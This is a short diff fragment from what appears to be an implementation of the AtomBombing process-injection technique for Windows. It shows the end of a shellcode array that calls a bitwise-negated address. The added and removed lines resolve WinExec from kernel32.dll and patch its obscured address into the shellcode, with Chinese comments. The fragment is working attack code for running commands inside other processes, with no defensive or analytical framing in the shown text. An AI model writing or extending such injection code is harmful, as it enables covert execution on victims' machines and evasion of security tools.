@@ -267,16 +267,16 @@ int AtombombingExecute()
         0x48, 0xF7, 0xD0,               // not rax
         0xFF, 0xD0                      // call rax
     };
-
-
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");
+    // 填充WinExec地址
+    *(UINT64*)(shellcode + 22) = ~WinExecAddr;
 
     NTSTATUS status = NULL;
 
-    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
-    UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");
 
-    // 填充WinExec地址
-    *(UINT64*)(shellcode + 22) = ~WinExecAddr;
+
+
 
 
     // 需要先load这个，否则 GlobalAddAtomA 返回错误：5
